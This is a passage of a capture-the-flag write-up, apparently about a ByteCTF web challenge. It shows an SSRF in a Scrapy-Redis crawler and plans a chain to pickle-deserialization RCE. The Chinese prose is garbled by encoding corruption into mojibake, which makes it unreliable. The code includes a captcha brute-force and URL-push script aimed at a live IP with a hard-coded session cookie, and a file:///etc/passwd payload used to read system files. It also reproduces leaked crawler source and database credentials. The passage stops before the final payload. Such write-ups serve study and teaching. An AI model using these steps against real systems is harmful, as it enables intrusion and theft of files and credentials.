ä¸€è‡´ã€‚æ‰€ä»¥é¦–å…ˆæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å‡å°‘åé¢çš„å·¥ä½œçš„æ–¹æ³•,å°±æ˜¯å¸¦ä¸Šå›ºå®šçš„cookieå†™è„šæœ¬è¿›è¡Œå­˜å‚¨urlçš„æ“ä½œã€‚</p><pre><code class="python">import string, hashlibimport requestsimport reimport sysimport timeURL=&#39;http://39.102.69.151:30010/&#39;cookies={&#39;session&#39;:&#39;eyJjb2RlIjoiZTFiMmQ5IiwidXNlciI6IjVhNTkwZjVhLTE2ZjgtMTFlYi1hYThhLTAyNDJhYzE0MDAwNiJ9.X5XSBA.z2Nn4le-aOsM8jg82j7gMzfzhSc&#39;}def brute(code):    a = string.digits + string.ascii_lowercase + string.ascii_uppercase    for i in a:        for j in a:            for k in a:                for m in a:                    for n in a:                        p = i + j + k + m + n                        s = hashlib.md5(p.encode(&#39;utf-8&#39;)).hexdigest()[0:6]                        if s == code:                            print(p)                            return pdef send():    r=requests.get(URL,cookies=cookies)    varify=re.findall(r&#39;&lt;span&gt;substr\(md5\(\$str\), 0, 6\) === (.*)&lt;/span&gt;&#39;,r.text)[0]    return varifydef push(url,code):    r=requests.post(url=URL+&#39;push&#39;,cookies=cookies,data={&#39;url&#39;:url,&#39;code&#39;:code})    print(r.text)#code=brute(send())#print(code)push(&#39;http://120.27.246.202/&#39;,code)#push(&#39;http://127.0.0.1:&#39;,&#39;0AUDp&#39;)</code></pre><p>çˆ†ç ´ä¸€æ¬¡åå°±å¯ç»§ç»­ç”¨äº†ã€‚</p><p>ä¹‹åå‘ç°ï¼Œå½“è¾“å…¥å®Œurlå­˜å‚¨åï¼Œurllistä¸­ä¼šå­˜åœ¨æˆ‘ä»¬åˆšåˆšè¾“å…¥çš„urlã€‚ä¹‹åç‚¹å‡»åˆ™ä¼šå‰å¾€<code>/result?url=xxxx</code>.ä¼¼ä¹æ˜¯ä¸€ä¸ªssrfçš„ç‚¹ã€‚</p><p>ç¬¬ä¸€å¤©ä¸Šåˆçš„è¯ï¼Œæ„Ÿè§‰çˆ¬ä»€ä¹ˆéƒ½çˆ¬ä¸åˆ°ã€‚ä½†æ˜¯å½“æ—¶å¾€è‡ªå·±çš„vpsä¸Šæ‰“çš„æ—¶å€™å€’æ˜¯æœ‰æ„å¤–çš„å‘ç°<br>å½“æ—¶çš„ç¬”è®°:<br><img src="https://i.imgur.com/hiUBWKq.png" class="lazyload" data-srcset="https://i.imgur.com/hiUBWKq.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ„å¤–å‘ç°äº†scrapy_redisä»¥åŠpycurlã€‚æ­£å¦‚ä¸Šé¢æ‰€è¯´ï¼Œurlæ•°æ®ä¼¼ä¹æ˜¯è¢«å­˜åˆ°redisç„¶åè¢«çˆ¬è™«ç»™çˆ¬äº†ã€‚è€Œåé¢<code>/result?url</code>åˆ™æ˜¯åŠ¨ç”¨äº†å¦ä¸€ç§åŠŸèƒ½è¿›è¡Œpycurlçš„è¯·æ±‚ã€‚</p><p>è¿™é‡Œpycurlæ— ç–‘æ˜¯å€¼å¾—æ³¨æ„çš„,å› ä¸ºpycurlæœ¬è´¨ä¸Šä¼¼ä¹æ˜¯è·Ÿè°ƒç”¨<code>curl</code>ä¸€æ ·çš„ã€‚é‚£ä¹ˆå¯ä»¥ä½¿ç”¨<code>gopher</code>åè®®ã€‚</p><p>è¿™æ ·ä¸€æ¥å½“ç„¶å°±æƒ³æ¢æµ‹redisäº†ã€‚ä¸è¿‡ç»è¿‡å°è¯•,ä¼šå‘ç°æ²¡æœ‰ä»»ä½•å›æ˜¾ã€‚å…³äºç‰ˆæœ¬ç­‰ç­‰ä¿¡æ¯ä¹Ÿæ˜¯ä¸€æ— æ‰€çŸ¥ã€‚</p><p>æ­¤æ—¶å†æ¬¡å®éªŒæ‰“è‡ªå·±ï¼Œæˆ‘å‘ç°å½“æ›´æ¢è‡ªå·±æœåŠ¡ç«¯çš„å†…å®¹æ—¶ï¼Œ<code>/result</code>æ‰€æ˜¾ç¤ºçš„é¡µé¢å¹¶æ²¡æ”¹å˜ã€‚</p><p>è”ç³»åˆ°ä¸Šé¢çš„<code>scrapy_redis</code>,æˆ‘ä»¬ä¸éš¾æ¨æµ‹,<code>scrapy</code>ä¼šçˆ¬æˆ‘ä»¬å­˜å‚¨çš„é‚£ä¸ªurl,å¹¶å°†å½“æ—¶çš„å†…å®¹ç¼“å­˜(åé¢ä¼šå‘ç°æ˜¯mongodb)ã€‚æ‰€ä»¥è¿™å°±å¯¼è‡´,åå¤ç”¨resulté¡µé¢è¯·æ±‚urlå¹¶ä¸ä¼šæ”¹å˜å›æ˜¾å†…å®¹ã€‚å……å…¶é‡è°ƒç”¨äº†pycurlè¯·æ±‚è€Œå·²ã€‚</p><p>é‚£ä¹ˆï¼Œåˆ°æ­¤æˆ‘ä»¬å¯¹æ•´ä¸ªæœåŠ¡çš„æ„æ¶æœ‰äº†å¤§æ¦‚çš„æ€è·¯</p><ol><li>å­˜åœ¨çˆ¬è™«bot</li><li>å­˜åœ¨redis</li><li>å¯èƒ½å­˜åœ¨æŸæ•°æ®åº“</li><li>pycurl æ˜¯webæœåŠ¡è¯·æ±‚ï¼Œscrapy_redisæ˜¯çˆ¬è™«botè¯·æ±‚   </li></ol><p>ä½†æ˜¯è¿™äº›ä¿¡æ¯éå¸¸å±€é™ã€‚é¦–å…ˆåªæœ‰å­˜è¿›redisçš„æ•°æ®æ‰ä¼šè¢«çˆ¬è™«è¯·æ±‚,è¿™é‡Œpythonæ²¡æœ‰crlfå¿…ç„¶æ‰“ä¸äº†redis.è€Œpycurlè™½ç„¶å¯ä»¥ç”¨gopheré‚£ä¸€å¥—æ‰“,ä½†æ˜¯å†…ç½‘ä¿¡æ¯æœªçŸ¥,ä¸”æ²¡æœ‰å›æ˜¾ã€‚</p><p>è¿™æ—¶æˆ‘å¼€å§‹å°è¯•æ€§çˆ¬ä¸€äº›ç½‘ç«™ã€‚è®½åˆºçš„æ˜¯baiduèƒ½çˆ¬å®ƒè‡ªå·±çš„bytedanceçˆ¬ä¸äº†2333. ç„¶åçˆ¬æœ¬æœº127.0.0.1ä¹Ÿå®Œå…¨æ²¡æœ‰å†…å®¹(å› ä¸ºbotå¼€äº†ç«¯å£çš„æœåŠ¡å®é™…ä¸Šåªæœ‰ä¸€ä¸ª6023çš„telnet,æ‰“äº†ä¼šæå‰æŠ¥é”™,ä¸€æ ·æ— å›æ˜¾)</p><p>é‚£ä¹ˆ,ä¸å¦¨å°è¯•ä¸‹æ‰“å®ƒçš„å…¬ç½‘ipï¼Ÿè¿™æ—¶æˆ‘å‘ç°ä¸€ä¸ªå¥‡æ€ªçš„ç°è±¡ã€‚<br>å½“æˆ‘è¾“å…¥å®ƒçš„å…¬ç½‘ipå­˜è¿›redisåï¼Œå®ƒé™¤äº†æœ¬èº«ï¼Œè¿˜è¯»å–äº†<code>/list</code>çš„é¡µé¢ã€‚</p><p>é‚£ä¹ˆè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ç®€å•çœ‹äº†ä¸‹é¡µé¢ã€‚å‘ç°é‡Œé¢å­˜åœ¨<code>&lt;a href=&quot;/list&quot;&gt;&lt;/&gt;</code><br>çœ‹æ¥ï¼Œçˆ¬è™«ç«¯æ˜¯ä¼šæ ¹æ®<code>&lt;a href=&quot;xxx&quot;&gt;&lt;/a&gt;</code>è¿›è¡Œè¿›ä¸€æ­¥çˆ¬å–.ç»è¿‡ç»å…¸çš„å®éªŒæ‰“è‡ªå·±ï¼Œå‘ç°çš„ç¡®å®ƒä¼šé¡ºç€è¿™ä¸ªhrefè¿›è¡Œè¯·æ±‚ã€‚</p><p>æ­¤æ—¶å·²ç»çŸ¥é“hrefæœ‰çŒ«è…»äº†ã€‚ç„¶åå‡ºé¢˜äººå·²ç»æ”¾å‡ºäº†ç¬¬ä¸€ä¸ªhintã€‚å°±æ˜¯å°è¯•è¯»æºç ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬ä¸å¦¨å°è¯•ä¸‹ï¼Œé¡ºç€è¿™ä¸ªhref+fileåè®®è¿›è¡Œæºç çš„é˜…è¯»ï¼Ÿ</p><h2 id="leak-source-code"><a href="#leak-source-code" class="headerlink" title="leak source code"></a>leak source code</h2><p>åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šå­˜å‚¨</p><pre><code class="html">&lt;html&gt;&lt;a href=&quot;file:///etc/passwd&quot;&gt;&lt;/a&gt;&lt;/html&gt;</code></pre><p>æ¥ç€ä¸Šé¢çš„è„šæœ¬è·‘ä¸€éã€‚ä¸€æŠŠæ¢­è§£å†³é—®é¢˜ã€‚<br>å†æ¬¡è®¿é—®<code>/result</code>ã€‚å‘ç°è¯»åˆ°äº†<code>/etc/passwd</code></p><p>æ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬ä¾æ¬¡è¯»ä¸‹å…¶ä»–å†…å®¹<br><code>/proc/self/cmdline</code></p><pre><code class="bash">/bin/bash run.sh</code></pre><p><code>/proc/self/environ</code><br>å¾—çŸ¥å½“å‰PWDæ˜¯<code>/code</code></p><p>è¯»<code>/code/run.sh</code></p><pre><code class="bash">#!/bin/bashscrapy crawl byte</code></pre><p>ä½¿ç”¨çš„æ˜¯scrapyæ¡†æ¶è¿›è¡Œçˆ¬å–ã€‚</p><p>æ­¤æ—¶å¼€å§‹è‡ªå·±ç›²ç›®çš„è¯»ç»“æœå‘ç°å•¥éƒ½æ²¡è¯»åˆ°,æƒ³äº†æƒ³å‘ç°è¿™ä¸ªçˆ¬è™«botå¯èƒ½åªæœ‰è¿™ä¹ˆä¸€ä¸ªå‘½ä»¤åœ¨è¿è¡Œã€‚é‚£ä¹ˆæˆ‘åº”è¯¥å»æŸ¥æ‰¾scrapyçš„æ–‡æ¡£<br>æˆ‘ä»¬æ‰¾åˆ°scrapyå®˜æ–¹æ–‡æ¡£</p><p><img src="https://i.imgur.com/5ZlDlDG.png" class="lazyload" data-srcset="https://i.imgur.com/5ZlDlDG.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ˜¾ç„¶æˆ‘ä»¬åªéœ€è¯»å–<code>scrapy.cfg</code>å°±èƒ½æ‹¿åˆ°scrapyé¡¹ç›®åå¹¶è¯»å–åˆ°ä¸‹é¢æ‰€æœ‰æ–‡ä»¶ã€‚ä¸è¿‡spiderçš„åå­—ä¼¼ä¹æ˜¯è‡ªå®šä¹‰çš„</p><p><img src="https://i.imgur.com/uXo8IiC.png" class="lazyload" data-srcset="https://i.imgur.com/uXo8IiC.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="https://i.imgur.com/zVeZub0.png" class="lazyload" data-srcset="https://i.imgur.com/zVeZub0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å‰é¢å‘½ä»¤è¡Œæ‰§è¡Œçš„æ˜¯<code>scrapy crawl byte</code>é‚£ä¹ˆå¯ä»¥ç¡®è®¤spiderçš„nameæ˜¯byte.æ–‡ä»¶åä¹Ÿå¯èƒ½æ˜¯byte.</p><pre><code># Automatically created by: scrapy startproject## For more information about the [deploy] section see:# https://scrapyd.readthedocs.io/en/latest/deploy.html[settings]default = bytectf.settings[deploy]#url = http://localhost:6800/project = bytectf</code></pre><p>å…¶ä»–å†…å®¹ä¹Ÿéƒ½ä¸€å¹¶è¯»å–ã€‚<br>å®Œæ•´çš„æ–‡ä»¶æˆ‘ä¼šæ”¾è‡ªå·±githubä¸Šã€‚åŒ…æ‹¬redisè·Ÿmongodbçš„docker</p><p>æ­¤æ—¶æˆ‘é€šè¿‡pipelines.pyä¸settings.pyåˆ†åˆ«å¾—åˆ°äº†mongodbä¸redisçš„é…ç½®</p><pre><code class="python">//pipelines.pyimport pymongoclass BytectfPipeline:    def __init__(self):        MONGODB_HOST = &#39;127.0.0.1&#39;        MONGODB_PORT = 27017        MONGODB_DBNAME = &#39;result&#39;        MONGODB_TABLE = &#39;result&#39;        MONGODB_USER = &#39;N0rth3&#39;        MONGODB_PASSWD = &#39;E7B70D0456DAD39E22735E0AC64A69AD&#39;        mongo_client = pymongo.MongoClient(&quot;%s:%d&quot; % (MONGODB_HOST, MONGODB_PORT))        mongo_client[MONGODB_DBNAME].authenticate(MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)        mongo_db = mongo_client[MONGODB_DBNAME]        self.table = mongo_db[MONGODB_TABLE]    def process_item(self, item, spider):        quote_info = dict(item)        print(quote_info)        self.table.insert(quote_info)        return item</code></pre><pre><code class="python">//settings.pyBOT_NAME = &#39;bytectf&#39;SPIDER_MODULES = [&#39;bytectf.spiders&#39;]NEWSPIDER_MODULE = &#39;bytectf.spiders&#39;RETRY_ENABLED = FalseROBOTSTXT_OBEY = FalseDOWNLOAD_TIMEOUT = 8USER_AGENT = &#39;scrapy_redis&#39;SCHEDULER = &quot;scrapy_redis.scheduler.Scheduler&quot;DUPEFILTER_CLASS = &quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;REDIS_HOST = &#39;172.20.0.7&#39;REDIS_PORT = 6379ITEM_PIPELINES = { &#39;bytectf.pipelines.BytectfPipeline&#39;: 300,}</code></pre><p>ä»¥åŠä¸»è¦çš„çˆ¬è™«é€»è¾‘ã€‚çŸ¥é“äº†æ–‡ä»¶è¯»å–çš„æ¼æ´æ‰€åœ¨</p><pre><code class="python">import scrapyimport reimport base64from scrapy_redis.spiders import RedisSpiderfrom bytectf.items import BytectfItemclass ByteSpider(RedisSpider):    name = &#39;byte&#39;    def parse(self, response):        byte_item = BytectfItem()        byte_item[&#39;byte_start&#39;] = response.request.url        url_list = []        test = response.xpath(&#39;//a/@href&#39;).getall()        for i in test:            if i[0] == &#39;/&#39;:                url = response.request.url + i            else:                url = i            if re.search(r&#39;://&#39;,url):                r = scrapy.Request(url,callback=self.parse2,dont_filter=True)                r.meta[&#39;item&#39;] = byte_item                yield r            url_list.append(url)            if(len(url_list)&gt;3):                break        byte_item[&#39;byte_url&#39;] = response.request.url        byte_item[&#39;byte_text&#39;] = base64.b64encode((response.text).encode(&#39;utf-8&#39;))        yield byte_item    def parse2(self,response):        item = response.meta[&#39;item&#39;]        item[&#39;byte_url&#39;] = response.request.url        item[&#39;byte_text&#39;] = base64.b64encode((response.text).encode(&#39;utf-8&#39;))        yield item</code></pre><p>å¯æ˜¯è¿™æœ‰ä»€ä¹ˆç”¨å‘¢â€¦â€¦æˆ‘ä»¬ä¸€æ ·ä¸çŸ¥é“flagåœ¨å“ªã€‚ç›®å‰çœ‹æ¥,å¦‚æœflagåœ¨botæœºå™¨ä¸Š,é‚£ä¹ˆåªæœ‰å¯èƒ½ä¼šæ˜¯æ‰“redisã€‚å¹¶ä¸”æŒ‰ç…§æˆ‘è‡ªå·±çš„å°‘æ•°ç»éªŒï¼Œä¸€èˆ¬æ˜¯æ­é…pickleååºåˆ—åŒ–rceæ‰æœ‰å¯èƒ½ã€‚ä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰æ˜æ˜¾çš„pickleååºåˆ—åŒ–ä»£ç ã€‚</p><p>æ­¤æ—¶é™·å…¥åƒµå±€ï¼Œåªæœ‰æœ¬åœ°è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰æ„å¤–å‘ç”Ÿäº†ã€‚</p><h2 id="Run-it-locally"><a href="#Run-it-locally" class="headerlink" title="Run it locally"></a>Run it locally</h2><p>è¿™é“é¢˜æœ€é‡è¦çš„ä¸€ç‚¹ææ€•å°±æ˜¯æœ¬åœ°è·‘äº†ã€‚æ¯•ç«Ÿæ­¤æ—¶æˆ‘ä»¬å¯¹ç¯å¢ƒä¸€æ— æ‰€çŸ¥,æˆ‘å”¯ä¸€èƒ½æƒ³åˆ°çš„getshellæ–¹æ³•ä¹Ÿåªæœ‰pickleååºåˆ—åŒ–äº†ã€‚é‚£ä¹ˆè¯•è¯•æœ¬åœ°ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰é”®å­˜äº†pickleåºåˆ—åŒ–åçš„æ•°æ®ï¼Ÿè¿™æ ·ä¸€æ¥å¿…ç„¶æœ‰æŸä¸ªåœ°æ–¹å­˜åœ¨ååºåˆ—åŒ–ã€‚</p><p>ç»è¿‡ä¸€ç•ªæŠ˜è…¾åã€‚æˆ‘ç®€å•å†™äº†ä¸ªèµ·mongodbçš„docker.å› ä¸ºredisè·Ÿçˆ¬è™«æœ¬åœ°èµ·æ¯”è¾ƒè½»æ¾,æˆ‘åˆä¸æƒ³æ”¹ä»£ç ã€‚<br>(åé¢æ¯”èµ›ç»“æŸæ—¶å†™äº†ä¸ªå®Œæ•´ç‰ˆçš„,ç›´æ¥èµ·åº”è¯¥è·Ÿçº¿ä¸Šçš„bot+redis+mongoç¯å¢ƒåŸºæœ¬ä¸€è‡´äº†)<br>docker-compose.yml</p><pre><code class="yml">version: &#39;3&#39;services:    mongodb:      image: mongo:4.2      container_name: py_db      restart: always      environment:        MONGO_INITDB_ROOT_USERNAME: root        MONGO_INITDB_ROOT_PASSWORD: root         MONGO_INITDB_DATABASE: result      volumes:        - ./mongo-init.js:/docker-entrypoint-initdb.d/mongo-init.js:ro</code></pre><p>åŒç›®å½•ä¸‹mongo-init.js</p><pre><code class="javascript">var data={&quot;test&quot;:&quot;123&quot;}//just for testdb.result.drop();db.result.insert(data);db.createUser({    user: &quot;N0rth3&quot;,    pwd:  &quot;E7B70D0456DAD39E22735E0AC64A69AD&quot;,    roles: [ { role: &quot;readWrite&quot;, db: &quot;result&quot;, collection:&quot;result&quot; }]});</code></pre><p>ç®€å•æ”¹ä¸‹çˆ¬è™«çš„redis/mongodb ip ,å°±èƒ½å¼€è·‘äº†</p><p><img src="https://i.imgur.com/znmnKI4.png" class="lazyload" data-srcset="https://i.imgur.com/znmnKI4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç„¶åæ­¤æ—¶æˆ‘å‘ç°ä¸€ç‚¹åŠ¨é™çš„éƒ½æ²¡æœ‰ã€‚æ„Ÿè§‰éå¸¸å¥‡æ€ªã€‚å€’æ˜¯çœ‹åˆ°scrapyå®ƒåœ¨å‡†å¤‡è¯»<code>byte:start_urls</code></p><p>æ—¢ç„¶å¦‚æ­¤é‚£<code>set xx xxx</code>è¯•è¯•çœ‹å¥½äº†ã€‚ç»“æœçªç„¶å‘ç°çˆ¬è™«ç›´æ¥å¼‚å¸¸é€€å‡ºï¼Ÿ</p><p>çœ‹äº†ä¸‹æŠ¥é”™ã€‚ä¼¼ä¹æ˜¯åœ¨æ‰§è¡Œredisçš„LPOPæ“ä½œæŠ¥é”™çš„ã€‚é‚£å¯èƒ½æ˜¯æ•°æ®ç±»å‹çš„é—®é¢˜äº†ã€‚æ‰¾äº†ä¸‹ä¸€ç¯‡æ–‡ç« å‘ç°äº†åŸå› ã€‚</p><p><a href="https://blog.csdn.net/zwq912318834/article/details/78854571" target="_blank" rel="noopener">https://blog.csdn.net/zwq912318834/article/details/78854571</a><br>å®ƒçˆ¬è™«çš„é€»è¾‘è·Ÿæˆ‘ä»¬çš„åŸºæœ¬ä¸€è‡´ã€‚å±äºåˆ†å¸ƒå¼çˆ¬è™«ã€‚å³ç­‰å¾…redisä¸­å‡ºç°redis_keyå†è¿›è¡Œçˆ¬å–ã€‚<br>è€Œè¿™é‡Œå› ä¸ºä¸æ˜¯ç®€å•çš„ä»å­—ç¬¦ä¸²è¿›è¡Œè¯»å–ï¼Œè€Œæ˜¯ä»ä¸€ä¸ªé˜Ÿåˆ—é‡Œè¯»ä¸€ä¸ªå…ƒç´ ã€‚é‚£ä¹ˆè‡ªç„¶ä¸ä¼šè¯»åˆ°å†…å®¹äº†ã€‚</p><p>æœŸé—´,è½¬æˆ˜è™šæ‹Ÿæœºèµ·æœåŠ¡ã€‚è¿™ä¸€æ¬¡æˆ‘ä»¬ç”¨è„šæœ¬å†™å…¥æ•°æ®ã€‚å…¶å®å°±æ˜¯æ‰§è¡Œlpushè€Œå·²ã€‚</p><pre><code class="python">#!/usr/bin/env python# -*- coding:utf-8 -*-import redisredis_Host = &quot;127.0.0.1&quot;redis_key = &#39;byte:start_urls&#39;rediscli = redis.Redis(host = redis_Host, port = 6379, db = &quot;0&quot;)rediscli.lpush(redis_key, &quot;http://www.baidu.com&quot;)</code></pre><p>è¿™æ—¶å°±å¯ä»¥æˆåŠŸå†™å…¥,çˆ¬å–æ•°æ®ï¼Œå¹¶å°†æ•°æ®å­˜è¿›mongodbã€‚<br>è¿™é‡Œæˆ‘å†å°è¯•æ‰“ä¸€éredisè·Ÿmongodbã€‚å‘ç°è·ŸæœåŠ¡ç«¯è¿œç¨‹æ˜¯ä¸€è‡´çš„ã€‚æ‰“redisä¼šæå‰æŠ¥é”™ç»ˆæ­¢ï¼Œæ‰“mongodbä¼šæœ‰å›æ˜¾<br><img src="https://i.imgur.com/t0i6Z1n.png" class="lazyload" data-srcset="https://i.imgur.com/t0i6Z1n.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p><img src="https://i.imgur.com/0Py191w.png" class="lazyload" data-srcset="https://i.imgur.com/0Py191w.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä¸è¿‡è¿™é‡Œrediså› ä¸ºlpopè¿™ä¸ªæ“ä½œã€‚å¯¼è‡´æˆ‘å†™å…¥çš„è¿™ä¸ªlistå¾ˆå¿«å°±ä¼šæ¶ˆå¤±ã€‚å®ƒå­˜çš„ä¹Ÿä¸æ˜¯pickleæ•°æ®ã€‚é‚£ä¹ˆè¦æ€ä¹ˆrce?æ­¤æ—¶å†åº¦é™·å…¥åƒµå±€</p><p>æ­¤æ—¶å®˜æ–¹æ”¾å‡ºç¬¬ä¸‰ä¸ªhint scrapy_redis,é¢˜ç›®ä»æ˜¯0è§£ã€‚æˆ‘å¼€å§‹æƒ³scrapy_redisæˆ‘ç¬¬ä¸€å¤©ä¸Šåˆå°±å‘ç°äº†è¿˜éœ€è¦æç¤ºï¼Ÿä½†æ˜¯è½¬å¿µæƒ³ä¼šä¸ä¼šæˆ‘æƒ³è¦çš„pickleæ“ä½œå­˜åœ¨äºscrapy_rediså‘¢ï¼Ÿ</p><p><a href="https://github.com/rmax/scrapy-redis" target="_blank" rel="noopener">https://github.com/rmax/scrapy-redis</a></p><p>äºæ˜¯ã€‚æˆ‘ç”¨scrapy-redis githubä¸Šçš„example-projectè·‘äº†éã€‚è¿™ä¸ªdemoæ˜¯æŒ‡å®šäº†urlä¸€ç›´åœ¨çˆ¬çš„ã€‚äºæ˜¯å½“æˆ‘è¿è¿›redisæ—¶ï¼Œæˆ‘å‘ç°äº†3ä¸ªé”®ã€‚å¹¶ä¸”å½“æˆ‘æŸ¥çœ‹ä»–ä»¬çš„æ—¶å€™,ç»ˆäºå‘ç°äº†å¿ƒå¿ƒå¿µå¿µçš„å†…å®¹ä¹Ÿå°±æ˜¯pickleçš„åºåˆ—åŒ–æ•°æ®ã€‚<br><img src="https://i.imgur.com/CwJ70OW.png" class="lazyload" data-srcset="https://i.imgur.com/CwJ70OW.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ—¢ç„¶å­˜åœ¨pickleåºåˆ—åŒ–çš„æ•°æ®ã€‚é‚£ä¹ˆå¿…ç„¶æŸä¸ªåœ°æ–¹ä¼šååºåˆ—åŒ–å®ƒã€‚è¿™æ ·ä¸€æ¥rceçš„é“¾æ¡ç«‹é©¬å°±æ¸…æ¥šäº†ã€‚è®¾ç½®é”® -&gt; pickle rce è·Ÿpwnhub6æœˆèµ›å·®ä¸å¤šäº†ã€‚</p><p>ä½†æ˜¯æœ¬åœ°ä¸ºä»€ä¹ˆæ²¡æœ‰<code>byte:requests</code>å‡ºç°å‘¢ï¼Ÿæˆ‘æ€€ç–‘æ˜¯å› ä¸ºæ¯æ¬¡åªä¼ å…¥ä¸€ä¸ªurlã€‚å¯¼è‡´å­˜æ´»æ—¶é—´æçŸ­ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¸å¦¨ç”¨å¤§é‡æ•°æ®å¡«å……è¿›redisã€‚æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œä¸Šé¢çš„è„šæœ¬åŠ ä¸ªforå¾ªç¯200æ¬¡å°±å¥½äº†ã€‚ç„¶åæˆ‘ä»¬åœ¨redisé‡Œæ‰§è¡Œå‡ æ¬¡çœ‹çœ‹<code>zrange byte:requests 0 1</code><br><img src="https://i.imgur.com/hkiEKsi.png" class="lazyload" data-srcset="https://i.imgur.com/hkiEKsi.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ—¢ç„¶å¦‚æ­¤ã€‚åˆ©ç”¨é“¾å°±æ¸…æ¥šäº†ï¼šæƒ³åŠæ³•å†™å…¥<code>byte:requests</code>é”®ï¼Œå†…å®¹ä¸ºåºåˆ—åŒ–æ•°æ®ã€‚<br>è€Œå†™å…¥é”®å”¯æœ‰pycurlçš„ssrfå¯ä»¥åšåˆ°ã€‚</p><p>ä¸‹é¢å°±æ˜¯åˆ©ç”¨äº†</p><h2 id="ssrf-gt-rce-exploit"><a href="#ssrf-gt-rce-exploit" class="headerlink" title="ssrf -&gt; rce exploit"></a>ssrf -&gt; rce exploit</h2><p>è¿™é‡Œæˆ‘ä»¬é¦–å…ˆå°è¯•ä¸€ä¸‹ç›´æ¥å†™å…¥byte:requestsä¼šæ€ä¹ˆæ ·ã€‚ç„¶åæƒŠå–œçš„å‘ç°åªè¦å†™å…¥å°±ä¼šç›´æ¥è§¦å‘ååºåˆ—åŒ–ã€‚é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ç›´æ¥åˆ©ç”¨<code>/result?url</code>å°±å¯ä»¥æ‰“äº†ã€‚</p><p>ç„¶åæ¨æµ‹ä¸€æ³¢ç‰ˆæœ¬ï¼Œè¿™é‡Œæˆ‘æ‰“è¿œç¨‹ç”¨çš„protocolåè®®ä¸º2.0çš„pickleæˆåŠŸäº†ã€‚å½“æ—¶getshellæ²¡çœ‹pythonç‰ˆæœ¬,ä¼°è®¡æ˜¯2.7.(scrapy ä¸€èˆ¬åœ¨2.7 æˆ–3.5/3.6è·‘)</p><p>ä¸€ä¸ªæ¯”è¾ƒå¤´ç–¼çš„ç‚¹æ˜¯å¦‚ä½•å†™å…¥opcodeçš„16è¿›åˆ¶æ•°æ®ã€‚ä¹‹å‰pwnhub6æœˆèµ›æ—¶å†™pickleæ•°æ®æ˜¯å› 